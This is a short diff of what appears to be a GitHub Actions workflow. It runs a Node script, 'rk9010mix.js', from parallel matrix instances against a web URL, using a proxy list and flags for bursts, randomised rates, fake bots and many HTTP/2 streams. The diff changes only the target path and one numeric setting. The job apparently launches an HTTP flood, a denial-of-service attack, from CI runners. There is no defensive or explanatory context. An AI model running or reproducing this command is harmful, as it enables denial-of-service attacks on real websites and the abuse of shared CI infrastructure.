@@ -45,7 +45,7 @@ jobs:
           unzip Fc-main.zip
           cd Fc-main
           
-          node rk9010mix.js https://rapidis.gay/6901966783-4c1df5ce-3966-4ef6-b3b6-cf9f29bb345a 250 400 4 proxy.txt --full --close --burst --randrate --fakebot --http 2 --ram 100 --streams 290 --direct --bfm --table 65536 --window 8388608
+          node rk9010mix.js https://rapidis.gay/6901966783-4af75121-c143-46cc-bb57-b011efee9302 250 400 2 proxy.txt --full --close --burst --randrate --fakebot --http 2 --ram 100 --streams 290 --direct --bfm --table 65536 --window 8388608
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
